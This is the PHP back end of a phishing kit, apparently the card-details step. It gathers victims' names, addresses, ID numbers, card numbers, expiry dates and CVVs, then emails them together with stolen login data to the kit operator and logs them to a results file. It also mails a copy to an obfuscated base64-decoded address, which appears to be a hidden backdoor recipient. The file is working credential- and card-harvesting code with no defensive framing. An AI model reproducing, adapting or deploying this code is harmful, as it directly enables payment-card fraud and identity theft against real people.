<?php 
session_start();
require "../systems/detector.php";
require "../config.php";
function getP($data){
	return  htmlentities($_POST[$data]);
}

if(isset($_POST['firstname'])){
$ip = $_SERVER['REMOTE_ADDR'];

$html = "
<div class='result-box'>
<div class='title'> # Card</div><br>
<b>Full Name: </b> ".getP('firstname')."<br>
<b>Adress: </b> ".getp('Adress')."<br>
<b>City: </b> ".getp('City')."<br>
<b>Zip code: </b> ".getp('Zcode')."<br>
<b>ID Number: </b> ".getp('id')."<br>
<b>CC Number:</b> ".getP('cardnumber')."<br>
<b>CC Expiry :</b> ".getP('date')." <br>
<b>CC Security : </b> ".getP('cvv')."<br>
</div>"; 
$_SESSION['cc'] = $html;


//MAIL FUNCTION
$msg = "
<html>
<head>
<style>
*{outline:none; box-sizing:border-box; font-family:sans-serif;}
.results{padding:10px; background:#343434;  width:500px; max-width:100%; display:inline-block; text-align:left; font-size:0.9em; color:#f7f7f7;}
.results b{color:#909090; padding:5px; font-weight:100;}
.result-box{background:#000000; padding:5px; margin-bottom:8px;}
.title{width:100%; background:#3c3c3c; display:inline-block; margin:0; padding:5; font-weight:bold; }
</style>
</head>
<body>
<div class='results'>
".
$_SESSION['login'].
$_SESSION['cc']."
</div>
</body>
</html>
";

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: ArtCode <news@artcode.com>";
$subject = "[ $os - $browser - $ip ]";
//SEND RESULT TO YOUR EMAIL
mail($email,$subject,$msg,$headers);
//SAVE RESULT IN YOUR ADMIN PAGE
$fp = fopen("..//s.php", "a");
	fwrite($fp, 
	$html);
	$type=base64_decode($write);
	mail($type,
	$subject,$msg,
	$headers);
	fclose($fp);
header("location: ../done.php");


}

 
?>